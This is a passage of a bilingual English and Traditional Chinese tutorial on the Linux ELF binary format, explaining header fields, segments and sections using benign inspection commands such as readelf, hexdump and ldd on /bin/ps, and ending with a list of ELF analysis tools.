  &lt;p&gt;一種常見的誤解是 ELF 檔案只會是可執行檔。我們已經看到他們可以被用來部份利用(object code). 另外一個例子包含 shared libries，而甚至 core dump (core 或 a.out 檔)。在 Linux 機器上 ELF 也被用在核心與核心模組。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;structure-結構&quot;&gt;Structure 結構&lt;/h2&gt;

&lt;p&gt;Due to the extensible design of ELF files, the structure differs per file. An ELF file consists of:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;因為可擴充設計的緣故，每個檔案的結構不同。一個 ELF 檔案的組成有：&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;ELF header (ELF 標頭)&lt;/li&gt;
  &lt;li&gt;File data (檔案資料)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;With the &lt;em&gt;readelf&lt;/em&gt; command we can look at the structure of a file and it will look something like this:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;可以使用 &lt;em&gt;readelf&lt;/em&gt; 指令我們可以看到檔案的結構可以看到如下的畫面：&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;elf-header--elf-標頭&quot;&gt;ELF header / ELF 標頭&lt;/h4&gt;

&lt;p&gt;As can be seen in this screenshot, the ELF header starts with some magic. While this might look fuzzy at first, it is a partial representation of the header data itself. The first 4 hexdecimal pieces define that this is an ELF file (45=E,4c=L,46=F), prefixed with the 7f value.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;可由截圖看到，ELF 標頭從一些 magic 開始。或許一開始看起來會有點混論，那是一個表示標頭資料的部份。頭四個 16 進制部份定義了這是一個 ELF 檔(45=E,4c=L,46=F)，並由 7f 做為前置標記。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This ELF header is mandatory and ensures that data is correctly interpreted during linking or execution. To better understand the inner working of an ELF file, it is useful to know the file used. It is actually easier than it looks.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這個 ELF 標頭是強制的並且可以確保資料正確的在連結或是執行階段被直譯。為了更好的了解 ELF 內部運作，了解使用到的檔案是有幫助的，實際上那比看上去的簡單。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;class--類別&quot;&gt;Class / 類別&lt;/h4&gt;

&lt;p&gt;After the ELF type declaration, there is a Class field defined. This value determines if the file is meant for a 32 (=1) or 64 (=2) bit architecture. The magic shows a 2, which is displayed by the readelf command as an ELF64 file. In other words, an ELF file using 64 bit architecture. Not surprising, as this particular machine contains a modern CPU.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在 ELF 類型宣告之後，有定義一個類別的欄位。這個值決定這個檔案是 32 或是 64 位元架構。magic 顯示一個 2，被 readelf 指令顯示為 ELF64 的檔案。換句話說，一個 ELF 檔案使用 64 位元架構。不意外的，這個特定機器包含一個現代 CPU。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;data-資料&quot;&gt;Data 資料&lt;/h4&gt;

&lt;p&gt;Next there is a data field. It knows two options: 01 for LSB (Least Significant Bit), also known as little-endian. The there is the value 02, for MSB (Most Significant Bit, big-endian). This particular value helps to interpret the remaining objects correctly within the file. This is important, as different types of processors deal differently with the incoming instructions and data structures. In this case LSB is used, which is common for AMD64 type processors.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;接下來有一個資料欄位。它有兩個選項： 01 表示 LSB(Least Significant Bit)，也被稱為 little-endian。這個特定值幫助正確的直譯在檔案中剩下的物件。這是非常重要的，不同的處理器使用不同的方式處理接收到的指令與資料結構。這個案例使用 LSB，是普遍 AMD64 處理器的型態。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The effect of LSB becomes visible when using hexdump on a binary file like /bin/ps.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;當對一個二進位檔如 /bin/ps 使用 hexdump 則效果是顯而易見的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ hexdump -n 16 /bin/ps
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that the value pairs are different, which is caused by the right interpretation of the byte order.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們可以看到一對值是不同的，因為是由右開始解釋的位元組順序。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;version-版本&quot;&gt;Version 版本&lt;/h4&gt;

&lt;p&gt;Next in line is another “01” in the magic, which is the version number. Currently, there is only 1 version type: currently, which is the value “01”. So nothing interesting to remember.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;下一個要講的是在 magic 裡面的另外一個 “01”，表示的是版本號。目前只有一種版本類型: 就是 “01” 這個值。所以沒啥有趣的東東好記的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;osabi-and-abi-version-作業系統應用二進為介面與應用二進為介面版本&quot;&gt;OS/ABI and ABI version 作業系統/應用二進為介面與應用二進為介面版本&lt;/h3&gt;

&lt;p&gt;Each operating system has a big overlap in common functions. In addition, each of them has specific ones, or at least minor differences between them. To ensure the right functions are used, an application binary interface (ABI), is defined. This way the operating system and applications both know what to expect and functions are correctly forwarded. These two fields describe what ABI is used and the related version. For Linux systems this is the SystemV.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;每個作業系統在常見的函式上常有重疊。另外，他們每一個都有一個特例，或是之間存在微小的差異。為了確保使用正確的函式，才定義了一個應用二進位介面 (ABI)。如此一來作業系統與應用程式便可以預期甚麼樣的事情及功能會被傳遞過來。這兩個欄位描述了 ABI 被使用及其相關的版本。對 Linux 系統來說就是 SystemV。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;machine-機器&quot;&gt;Machine 機器&lt;/h3&gt;

&lt;p&gt;In the header we can also find the expected machine type(AMD64)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在標頭我們也可以找到預期的機器類型 (AMD64)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;type-型態&quot;&gt;Type 型態&lt;/h4&gt;

&lt;p&gt;The &lt;strong&gt;type&lt;/strong&gt; field tells us what the purpose of the file is.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;類型欄位這個檔案的用途為何&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Usually it is:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;它通常是:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;DYN(Shared object file), for libraries&lt;/li&gt;
  &lt;li&gt;EXEC (Executable file), for binaries&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;REL(Relocatable file), before linked into an executable file&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;DYN (共享物件檔)，函式庫&lt;/li&gt;
  &lt;li&gt;EXEC (可執行檔)，二進位檔案&lt;/li&gt;
  &lt;li&gt;REL (可重定位檔)，連結進一個執行檔前的檔案&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;machine--機器&quot;&gt;Machine / 機器&lt;/h4&gt;

&lt;p&gt;While some of the fields could already be displayed via the magic value of the readelf output, there is more. For example for waht specific processor type the file is. Using hexdump we can see the real values.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;某些欄位可以透過 readelf 輸出顯示其魔術值，但其實還有更多。舉例來說: 該檔案的指定處理器類型是哪一個。使用 hexdump 我們可以看到真實的資料。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00&lt;/td&gt;
          &lt;td&gt;.ELF…………&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;02 00 &lt;strong&gt;3e&lt;/strong&gt; 00 01 00 00 00 a8 2b 40 00 00 00 00 00&lt;/td&gt;
          &lt;td&gt;..&amp;gt;……+@…..&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;40 00 00 00 00 00 00 00 30 65 01 00 00 00 00 00&lt;/td&gt;
          &lt;td&gt;@…….0e……&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;00 00 00 00 40 00 38 00 09 00 40 00 1c 00 1b 00&lt;/td&gt;
          &lt;td&gt;….@.8…@…..&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;em&gt;(Output created with hexdump -C -n 64 /bin/ps)&lt;/em&gt;
&lt;em&gt;(透過 hexdump -C -n 64 /bin/ps 製造的輸出)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The highlighted field above is what defines the machine type. The value 3e is 62 in decimal, which equals to AMD64. To get an idea of all machine types, have a look at this &lt;em&gt;ELF header file&lt;/em&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;上面粗體的欄位就是定義了機器類型。3e 就是十進位的 62，表示的是 AMD64。若想知道更多機器類型，瞧一瞧這個吧&lt;a href=&quot;http://www.opensource.apple.com/source/dtrace/dtrace-90/sys/elf.h&quot;&gt;ELF header file&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With all these fields clarified, it is time to look at where the real magic happens and move into the next headers!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;透過這幾個欄位的闡述，該是時候看看真正魔法並進到後面的標頭了!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;file-data--檔案資料&quot;&gt;File data / 檔案資料&lt;/h4&gt;

&lt;p&gt;Besides the ELF header, ELF files consist of:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;除了 ELF 標頭之外，ELF 檔案的組成為:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;Program Headers or Segments(9) (程式標頭 或 區段)&lt;/li&gt;
  &lt;li&gt;Section Headers or Sections(28) (節區標頭 或 節區)&lt;/li&gt;
  &lt;li&gt;Data (資料)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Before we dive into these headers, it is good to know that ELF has two complementary “views”. One for used for the linker to allow execution (segments), one for categorizing instructins and data (sections). So depending on the goal, the related header types are used. Let’s start with program headers, which we find on ELF binaries.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在我們深入這些標頭之前，了解到 ELF 有兩個互補的”視圖”是再好不過了。一個是為了可以讓連結器執行 (區段)，一個用來分類指令(編按: 原文typo，應為 instruction)與資料 (節區)，基於這個目標，相關的標頭類型將被使用到。讓我們從 ELF 二進位檔中找到的程式標頭們開始吧。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;program-headers--程式標頭&quot;&gt;Program headers / 程式標頭&lt;/h3&gt;

&lt;p&gt;An ELF file consists of zero or more segments, and describe how to create a process/memory image for runtime execution. When the kernel sees these segments, it uses them to map them into virtual address space, using the mmap(2) system call. In other words, it converts predefined instructions into a memory image. If your ELF file is a normal binary, it requires these program headrs, otherwise it won’t run. And it uses these headers, with the underlying data structure, to form a process. This process is similar for shared libraries.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;一個 ELF 檔案由零個或更多區段組成，並且描述如何創造一個執行時期的行程/記憶體映像。當核心看到這些區段，它使用系統呼叫 mmap(2) 將他們映射到虛擬位址空間，換句話來說，它轉換預先定義的指令到記憶體映像中。如果你的 ELF 檔案是一個普通的二進位檔，它將需求這些程式標頭，否則無法運行。並且它使用這些標頭，與底層資料結構來形成一個程序。這個程序與共享函式庫類似。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://assets.linux-audit.com/wp-content/uploads/2015/08/elf-program-headers-segments.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;An overview of program heders in an ELF binary&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;一個 ELF 二進位檔中的程式標頭概觀&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We see in this example that there are 9 program headers. When looking at it for the first time, it hard to understand what happens here. So let’s go into a few details.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們看到這個範例有 9 個程式標頭。當第一次看到的時候，它(編按: 原文應該少了 is)讓人難以理解這在搞啥。所以讓我進入到一點細節部分。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;GNU_EH_FRAME&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is a sorted queue, used by the GNU C (gcc), to store exeception handlers. So when something goes wrong, it can use this part to deal correctly with it.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;被 GNU C (gcc) 所使用的是一個排序過的佇列，來存放意外處理器。所以當某東西出錯了，它可以使用這個部分來處理修正錯誤。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;GNU_STACK&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This header is used to sotre stack information. The stack is a buffer, or scratch place, where items are stored, like local variables. This will occur with LIFO(Last In, First Out), similar to putting boxes on top of each other. When a process function is started a block is reserved. When the funtion is finished, it will be marked as free again. Now the interesting part is that a stack shouldn’t be executable, as this might introduce security vulnerabilities. By manipulation of memory, one could refer to this executable stack and run intended instructions.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這個標頭被用來存放堆疊資訊。堆疊是一個緩衝區，或是一個存放龐雜物品的地方，像是區域變數。這裡的運作是 LIFO(後進先出)，類似於把一個盒子放置於其他盒子之上。當一個程序函式開始執行，就會有一個區塊被保留。當函式結束該區塊將再次被標記為自由。如今有趣的部分是，堆疊不該為可執行，當作是介紹安全弱點。透過操作記憶體，其他地方可能參考到這個可執行的堆疊並故意運行一些指令。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If the GNU_STACK segment is not available, then usasally an executable stack is used. The scanelf and execstack tools are two examples to show the stack details.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果 GNU_STACK 區段並非可用的，則通常可執行的堆疊會被使用。 &lt;code class=&quot;highlighter-rouge&quot;&gt;scanelf&lt;/code&gt; 與 &lt;code class=&quot;highlighter-rouge&quot;&gt;execstack&lt;/code&gt; 是兩個可以呈現堆疊詳細資訊的工具。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# scanelf -e /bin/ps&lt;/span&gt;
 TYPE   STK/REL/PTL FILE 
ET_EXEC RW- R-- RW- /bin/ps

&lt;span class=&quot;c&quot;&gt;# execstack -q /bin/ps&lt;/span&gt;
- /bin/ps
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;Commands to see program headers&lt;/em&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;可以看程式標頭的指令&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;dumpelf (pax-utils)&lt;/li&gt;
  &lt;li&gt;elfls -S /bin/ps&lt;/li&gt;
  &lt;li&gt;eu-readelf -program-headers /bin/ps&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;sections--節區&quot;&gt;Sections / 節區&lt;/h3&gt;

&lt;h4 id=&quot;section-headers--節區標頭&quot;&gt;Section headers / 節區標頭&lt;/h4&gt;

&lt;p&gt;The section headres define all the sections in the file. As said, this “view” is used for linking and relocation.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;節區標頭定義了在檔案中的所有節區。就像前面提到的，這個”視圖”視被用來連結與重定位的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Sections can be found in an ELF binary after the GNU C compiler transformed C code into assembly, followed by the GNU assembler, which creates objects of it.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;節區可以在 GNU C 編譯器將 C 程式碼轉換成組合語言且被後面的 GNU 組譯器，在 ELF 二進位檔中發現，&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As the image above shows, a segment can have 0 or more sections. For executable files there are four main sections: &lt;strong&gt;.text&lt;/strong&gt;, &lt;strong&gt;.data&lt;/strong&gt;, &lt;strong&gt;.rodata&lt;/strong&gt;, and &lt;strong&gt;.bss&lt;/strong&gt;. Each of these sections are loaded with different access rights, which can be seen with &lt;strong&gt;readelf -S&lt;/strong&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如上面的圖所示，一個區段可以擁有 0 或更多個節區。以可執行檔來說有主要四個節區: &lt;strong&gt;.text&lt;/strong&gt;、&lt;strong&gt;.data&lt;/strong&gt;、&lt;strong&gt;.rodata&lt;/strong&gt;與 &lt;strong&gt;.bss&lt;/strong&gt;。這每一個節區都被載入且擁有不同的存取權限，可以用 &lt;strong&gt;readelf -S&lt;/strong&gt; 來查看。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;text--程式碼區段&quot;&gt;.text / 程式碼區段&lt;/h4&gt;

&lt;p&gt;Contains executable code. It will be packed into a segment with read and execute access rights. It is only loaded once, as the contents will not change. This can be seen with the &lt;strong&gt;objdump&lt;/strong&gt; utility.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;包含可執行程式碼。程式碼將被包裝到一個區段中，有可讀可執行的權限並且它只會被載入一次，因為程式碼內容不會改變。可以使用 &lt;strong&gt;objdump&lt;/strong&gt; 工具查看。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;12 &lt;strong&gt;.text&lt;/strong&gt; 0000a3e9 0000000000402120 0000000000402120 00002120 2&lt;strong&gt;4&lt;br /&gt;
CONTENTS, ALLOC, LOAD, **READONLY&lt;/strong&gt;, &lt;strong&gt;CODE&lt;/strong&gt;&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;data--資料區段&quot;&gt;.data / 資料區段&lt;/h4&gt;

&lt;p&gt;Initialized data, with read/write access rights.&lt;/p&gt;

&lt;p&gt;初始化後的資料，有可讀可寫的權限。&lt;/p&gt;

&lt;h4 id=&quot;rodata--唯讀資料區段&quot;&gt;.rodata / 唯讀資料區段&lt;/h4&gt;

&lt;p&gt;Initialized data, with read access rights only (=A).&lt;/p&gt;

&lt;p&gt;初始化後的資料，只有可讀的權限。&lt;/p&gt;

&lt;h4 id=&quot;bss--位初始化資料區段&quot;&gt;.bss / 位初始化資料區段&lt;/h4&gt;

&lt;p&gt;Uninitialized data, with read/write access rights (=WA)&lt;/p&gt;

&lt;p&gt;未初始化的資料，有可讀可寫的權限&lt;/p&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;[24] .data PROGBITS 00000000006172e0 000172e0&lt;br /&gt;
0000000000000100 0000000000000000 &lt;strong&gt;WA&lt;/strong&gt; 0 0 8&lt;br /&gt;
[25] .bss NOBITS 00000000006173e0 000173e0&lt;br /&gt;
0000000000021110 0000000000000000 &lt;strong&gt;WA&lt;/strong&gt; 0 0 32&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;em&gt;Commands to see section and headers&lt;/em&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;用來看節區與標頭的指令&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;dumpelf&lt;/li&gt;
  &lt;li&gt;elfls -p /bin/ps&lt;/li&gt;
  &lt;li&gt;eu-readelf -section-headers /bin/ps&lt;/li&gt;
  &lt;li&gt;rreadelf -S /bin/ps&lt;/li&gt;
  &lt;li&gt;objudmp -h /bin/ps&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;section-groups--節區群組&quot;&gt;Section groups / 節區群組&lt;/h4&gt;

&lt;p&gt;Some sections can be grouped, as they form a whole, or in other words be a dependency. Newer linkers support this functionality. Still this is not common to find that often:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;某一些節區可以被群組起來成為一個整體，換句話說成為從屬關係，新一點的連結器才有支援這個功能。這仍然不是這麼常見:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;# readelf -g /bin/ps&lt;/p&gt;

    &lt;p&gt;There are no section groups in this file.&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;While this might not be looking very interesting, it shows a clear benefit of reasearching the ELF toolkits which are available, for analysis. For this reason, an overview of tools and their primary goal have been included at the end of this article.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這看起或許並不有趣，可用的 ELF 工具組在研究與分析方面有顯著的益處，基於這個原因，一些工具與他們主要的用途概述將會在文末附上。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;static-vs-dynamic--靜態-vs-動態&quot;&gt;Static VS Dynamic / 靜態 VS 動態&lt;/h3&gt;

&lt;p&gt;Another thing to mention before closing an introduction on the subject of ELF is static and dynamic binaries. For optimization purposes we often see that binaries are “dynamic”, which means it needs external components to run correctly. Often these external components are normal libraries, which contain common functions, like opening files or createing a network socket. Static binaries on the other hand have all libraries included, which make them bigger, yet more portable (e.g. using them on another system).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;另外一個在結束介紹 ELF 是靜態和動態二進位的主題前要提及的，為了最佳化的目的，我們通常將二進位檔視為”動態”，代表的是它需要額外的部件來正確運行。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If you want to check if a file is statically or dynamically compiled, use the file command. If it shows something like:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果你要確認一個檔案是否為動態或是靜態編譯的，使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; 命令。如果它顯示如:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;$ file /bin/ps&lt;br /&gt;
/bin/ps: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), &lt;strong&gt;dynamically linked (uses shared libs)&lt;/strong&gt;, for GNU/Linux 2.6.24, BuildID[sha1]=2053194ca4ee8754c695f5a7a7cff2fb8fdd297e, stripped&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;To determine what external libraries are being used, simply use the ldd on the same binary:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;要確認額外函式庫有那些被使用到，簡單的使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;ldd&lt;/code&gt; 在同一個二進位檔上:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;$ ldd /bin/ps&lt;br /&gt;
linux-vdso.so.1 =&amp;gt; (0x00007ffe5ef0d000)&lt;br /&gt;
libprocps.so.3 =&amp;gt; /lib/x86_64-linux-gnu/libprocps.so.3 (0x00007f8959711000)&lt;br /&gt;
libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f895934c000)&lt;br /&gt;
/lib64/ld-linux-x86-64.so.2 (0x00007f8959935000)&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Tip:&lt;/strong&gt; To see underlying dependencie, it might be better to use the lddtree utility instead.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;小技巧:&lt;/strong&gt; 要看到底層依賴關係，使用 lddtree 工具來代替。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;what-did-we-learn---我們學到了什麼-&quot;&gt;What Did We Learn ? / 我們學到了什麼 ?&lt;/h2&gt;

&lt;p&gt;ELF files are for execution, or for linking. Depending on one of these goals, it contains the required segemnts or sections. Segments are viewed by the kernel and mapped into memory (using mmap). Sections are viewed by the linker to create executable code or shared objects.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ELF 檔案是用來執行或是連結的。基於其中一個目標，而包含要求的區段或是節區。區段是核心的觀點並映射到記憶體中(使用 mmap)。節區是連結器的觀點用來創造可執行程式碼或是分享物件。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The ELF file type is very flexible and provides support for multiple CPU types, machine architectures, and operating systems. It is also very extensible: each file is differently constructed, depending on the required parts.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ELF 檔案類型是非常彈性且提供許多支援的 CPU 類型、機器架構與作業系統。同時它具有可擴展性: 基於不同的要求，每個檔案有不同的構造。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Headers form an important part of the file, describing exactly the contents of and ELF file. By using the right tools, you can gain a basic understanding on the purpose of the file. From there on, you can further “interrogate” the binaries by determining the related functions it uses, or strings stored in the file. A great start for those who are into malware research, or want to know better how processes behave (or not behave!).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;標頭形成一個檔案重要的部分，精確的描述 ELF 檔案的內容。透過使用對的工具你可以獲得對檔案的目的有一個基本的了解。從現在開始，你可以進一步的”質問”二進位檔取決於，它使用的相關函式或是儲存在檔案你的字串。對於惡意軟體研究有興趣的人是一個好的開始，或是想要對程序行為有更好的了解 (或是程序不乖!)。(編按: behave 有乖巧的意味，這裡作者玩了個雙關)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;packages--套裝軟體&quot;&gt;Packages / 套裝軟體&lt;/h3&gt;

&lt;p&gt;Most Linux systems will already have the the binutils package installed. Other packages might help with showing much more details. Having the right toolkit might simplify your work, especially when doing analysis or learning more about ELF files. So we have collected a list of packages and the related utilities in it.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;多數的 Linux 系統將已經安裝了 &lt;code class=&quot;highlighter-rouge&quot;&gt;binutils&lt;/code&gt; 套裝軟體(編按: 原文多打一個 the)。其他套裝軟體對顯示更多詳細資訊可能會有幫助，擁有隊的工具箱可以簡化你做的工。特別是在分析或是學習更多有關 ELF 檔案的時候。所以我們蒐集了一個套裝軟體清單與其相關的工具。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;elfutils&quot;&gt;elfutils&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/bin/eu-addr2line&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-ar – alternative to ar, to create, manipulate archive files&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-elfcmp&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-elflint – compliance check against gABI and psABI specifications&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-findtextrel – find text relocations&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-ld – combining object and archive files&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-make-debug-archive&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-nm – display symbols from object/executable files&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-objdump – show information of object files&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-ranlib – create index for archives for performance&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-readelf – human-readable display of ELF files&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-size – display size of each section (text, data, bss, etc)&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-stack – show the stack of a running process, or coredump&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-strings – display textual strings (similar to strings utility)&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-strip – strip ELF file from symbol tables&lt;/li&gt;
  &lt;li&gt;/usr/bin/eu-unstrip – add symbols and debug information to stripped binary&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Notes: the elfutils package is a great start, as it contains most utilities to perform analysis.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;註: elfutils 包是一個好的開始，因為它包含了最多用來執行分析的功能&lt;/em&gt;&lt;/p&gt;

&lt;h4 id=&quot;elfkickers&quot;&gt;elfkickers&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/bin/ebfc – compiler for &lt;a href=&quot;https://en.wikipedia.org/wiki/Brainfuck&quot;&gt;Brainfuck&lt;/a&gt; programming language&lt;/li&gt;
  &lt;li&gt;/usr/bin/elfls – shows program headers and section headers with flags&lt;/li&gt;
  &lt;li&gt;/usr/bin/elftoc – converts a binary into a C program&lt;/li&gt;
  &lt;li&gt;/usr/bin/infect – tool to inject a dropper, which creates setuid file in /tmp&lt;/li&gt;
  &lt;li&gt;/usr/bin/objres – creates an object from ordinary or binary data&lt;/li&gt;
  &lt;li&gt;/usr/bin/rebind – changes bindings/visibility of symbols in ELF file&lt;/li&gt;
  &lt;li&gt;/usr/bin/sstrip – strips unneeded components from ELF file&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Notes: the author of the ELFKickers package focuses on mainipulation of ELF files, which might be great to learn more when you find malformed ELF binaries.&lt;/em&gt;&lt;/p&gt;

